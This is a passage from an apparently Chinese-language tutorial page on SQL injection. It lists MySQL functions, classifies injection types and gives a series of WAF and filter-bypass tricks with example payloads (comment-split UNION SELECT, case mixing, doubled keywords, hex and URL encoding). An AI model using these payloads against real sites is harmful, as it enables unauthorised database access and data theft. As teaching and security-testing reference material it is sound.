</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">@@</span><span class="n">basedir</span><span class="p">:</span><span class="n">mysql安装路径</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">@@</span><span class="n">version_complie_os</span><span class="p">:</span><span class="err">查看操作系统</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ascii</span><span class="p">(</span><span class="n">str</span><span class="p">):</span><span class="err">返回给定字符的</span><span class="n">ascii值</span><span class="err">。如果</span><span class="n">str是空字符串</span><span class="err">，返回</span><span class="mi">0</span><span class="err">如果</span><span class="n">str是NULL</span><span class="err">，返回</span><span class="k">NULL</span><span class="err">。如</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">=</span><span class="mi">97</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">length</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="err">返回给定字符串的长度，如</span><span class="w"> </span><span class="k">length</span><span class="p">(</span><span class="s2">&#34;string&#34;</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">substr</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="k">start</span><span class="p">,</span><span class="k">length</span><span class="p">):</span><span class="err">对于给定字符串</span><span class="n">string</span><span class="err">，从</span><span class="n">start位开始截取</span><span class="err">，截取</span><span class="n">length长度</span><span class="w"> </span><span class="p">,</span><span class="err">如</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="s2">&#34;chinese&#34;</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">=</span><span class="s2">&#34;in&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">substr</span><span class="p">()</span><span class="err">、</span><span class="n">stbstring</span><span class="p">()</span><span class="err">、</span><span class="n">mid</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="err">三个函数的用法、功能均一致</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">concat</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="err">：将查询到的</span><span class="n">username连在一起</span><span class="err">，默认用逗号分隔</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">concat</span><span class="p">(</span><span class="n">str1</span><span class="p">,</span><span class="s1">&#39;*&#39;</span><span class="p">,</span><span class="n">str2</span><span class="p">)</span><span class="err">：将字符串</span><span class="n">str1和str2的数据查询到一起</span><span class="err">，中间用</span><span class="o">*</span><span class="err">连接</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="err">：将</span><span class="n">username所有数据查询在一起</span><span class="err">，用逗号连接</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="err">：查询第</span><span class="mi">1</span><span class="err">个数</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="err">：查询第</span><span class="mi">2</span><span class="err">个数</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="sql注入分类" class="heading-element"><span>SQL注入分类</span>
 <a href="#sql%e6%b3%a8%e5%85%a5%e5%88%86%e7%b1%bb" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><table>
 <thead>
 <tr>
 <th style="text-align: center">分类依据</th>
 <th style="text-align: center">类型</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td style="text-align: center">获取信息的方式</td>
 <td style="text-align: center">布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等</td>
 </tr>
 <tr>
 <td style="text-align: center">提交方式</td>
 <td style="text-align: center">GET、POST、COOKIE、HTTP 注入等</td>
 </tr>
 <tr>
 <td style="text-align: center">注入点类型</td>
 <td style="text-align: center">数字类型的注入、字符串类型的注入、搜索型注入等</td>
 </tr>
 <tr>
 <td style="text-align: center">其他注入</td>
 <td style="text-align: center">二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td>
 </tr>
 </tbody>
</table>
<h2 id="绕过空格" class="heading-element"><span>绕过空格</span>
 <a href="#%e7%bb%95%e8%bf%87%e7%a9%ba%e6%a0%bc" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>使用注释符<code>/* */</code></p>
</li>
<li>
<p>两个空格代替一个空格</p>
</li>
<li>
<p><code>%a0</code></p>
</li>
<li>
<p>用Tab代替空格</p>
</li>
<li>
<p>括号绕过</p>
<blockquote>
<p>前提时括号没被过滤</p>
</blockquote>
<p><strong>任何可以计算出结果的语句</strong>，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例：<code>select(user())fromdualwhere(1=1)and(2=2)</code></p>
</li>
</ul>
<h2 id="引号绕过" class="heading-element"><span>引号绕过</span>
 <a href="#%e5%bc%95%e5%8f%b7%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>使用十六进制</p>
<p>例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">……where table_name=&#34;users&#34;		# 把users转为十六进制
</span></span><span class="line"><span class="cl">……where table_name=0x7573657273</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="逗号绕过" class="heading-element"><span>逗号绕过</span>
 <a href="#%e9%80%97%e5%8f%b7%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>盲注的时候，substr()，mid()，limit()等方法需要逗号</p>
</blockquote>
<ul>
<li>
<p>对于<code>substr()</code>和<code>mid()</code>使用from to解决</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select substr(database(0 from 1 for 1);
</span></span><span class="line"><span class="cl">select mid(database(0 from 1 for 1);</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>对于<code>limit()</code>使用offset绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select*from news limit0,1
</span></span><span class="line"><span class="cl">===&gt; select*from news limit 1 offset 0</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="比较符号绕过" class="heading-element"><span>比较符号（&lt;&gt;）绕过</span>
 <a href="#%e6%af%94%e8%be%83%e7%ac%a6%e5%8f%b7%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>盲注的时候，使用二分查找的时候需要使用到比较操作符来进行查找</p>
</blockquote>
<ul>
<li>使用greatest()绕过</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64
</span></span><span class="line"><span class="cl">===&gt; select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>or 'password' &gt; 'pass' or 1&lt;3</code></li>
</ul>
<h2 id="or-and-绕过" class="heading-element"><span>or and 绕过</span>
 <a href="#or-and-%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li><code>and</code> =&gt; <code>&amp;&amp;</code></li>
<li><code>or</code> =&gt; <code>||</code></li>
</ul>
<h2 id="绕过注释符号--" class="heading-element"><span>绕过注释符号（#，&ndash;）</span>
 <a href="#%e7%bb%95%e8%bf%87%e6%b3%a8%e9%87%8a%e7%ac%a6%e5%8f%b7--" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1&#39; union select 1,2,3||&#39;1
</span></span><span class="line"><span class="cl">id=1&#39;union select 1,2,&#39;3</span></span></code></pre></td></tr></table>
</div>
</div><p>同或(!=!)可以构造</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=tarnish&#39;!=!(1)!=!&#39;1	#(True !=! True !=! True) == True
</span></span><span class="line"><span class="cl">username=tarnish&#39;!=!(0)!=!&#39;1	#(True !=! False !=! True) == False</span></span></code></pre></td></tr></table>
</div>
</div><p>原理：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">同或 !=! 的逻辑：
</span></span><span class="line"><span class="cl">1 !=! 1 == 1
</span></span><span class="line"><span class="cl">1 !=! 0 == 0
</span></span><span class="line"><span class="cl">0 !=! 1 == 0
</span></span><span class="line"><span class="cl">0 !=! 0 == 1</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="绕过" class="heading-element"><span>=绕过</span>
 <a href="#%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>用 like</li>
<li><code>&gt;</code></li>
<li><code>&lt;</code></li>
</ul>
<h2 id="绕过unionselectwhere" class="heading-element"><span>绕过union，select，where</span>
 <a href="#%e7%bb%95%e8%bf%87unionselectwhere" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h3 id="使用注释符绕过" class="heading-element"><span>使用注释符绕过</span>
 <a href="#%e4%bd%bf%e7%94%a8%e6%b3%a8%e9%87%8a%e7%ac%a6%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl">/**/
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl">--+
</span></span><span class="line"><span class="cl">-- -
</span></span><span class="line"><span class="cl">;
</span></span><span class="line"><span class="cl">%00
</span></span><span class="line"><span class="cl">--a</span></span></code></pre></td></tr></table>
</div>
</div><p>用法：<code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
<h3 id="大小写绕过" class="heading-element"><span>大小写绕过</span>
 <a href="#%e5%a4%a7%e5%b0%8f%e5%86%99%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39;UnIoN/**/SeLeCT</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="内敛注释绕过" class="heading-element"><span>内敛注释绕过</span>
 <a href="#%e5%86%85%e6%95%9b%e6%b3%a8%e9%87%8a%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="双写关键字绕过" class="heading-element"><span>双写关键字绕过</span>
 <a href="#%e5%8f%8c%e5%86%99%e5%85%b3%e9%94%ae%e5%ad%97%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39;UNIunionONSeLselectECT1,2,3–</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="通用绕过编码" class="heading-element"><span>通用绕过（编码）</span>
 <a href="#%e9%80%9a%e7%94%a8%e7%bb%95%e8%bf%87%e7%bc%96%e7%a0%81" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><ul>
<li>
<p>URLEncode</p>
</li>
<li>
<p>ASCII</p>
</li>
<li>
<p>HEX</p>
</li>
<li>
<p>unicode</p>
<p>一些unicode编码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">or 1=1
</span></span><span class="line"><span class="cl">%6f%72%20%31%3d%31
</span></span><span class="line"><span class="cl">CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="等价函数绕过" class="heading-element"><span>等价函数绕过</span>
 <a href="#%e7%ad%89%e4%bb%b7%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hex()、bin()==&gt;ascii()
</span></span><span class="line"><span class="cl">
